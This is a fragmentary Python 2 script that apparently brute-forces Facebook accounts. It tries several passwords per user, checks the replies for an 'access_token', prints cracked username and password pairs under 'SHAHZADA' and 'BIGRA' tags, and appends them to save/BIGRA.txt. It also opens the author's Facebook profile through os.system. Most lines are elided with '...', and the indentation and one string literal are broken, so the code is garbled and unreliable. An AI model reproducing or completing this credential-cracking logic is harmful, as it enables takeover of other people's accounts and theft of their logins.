...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://www.facebook.com/faisalzuman.orakzai.7)
    else:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[SHAHZADA] ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/BIGRA.txt', 'a')
                ...
                if 'www.facebook.com' in q['error_msg']:
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[SHAHZADA] ' + k + c + user + '  |  ' + pass3
                                okb = open('save/BIGRA.txt', 'a')
                               ...
                               if 'www.facebook.com' in q['error_msg']:
                                   print '\033[1;97m[BIGRA] ' + k + c + user + '  |  ' + pass3
                                   cps = open('save/BIGRA.txt', 'a')
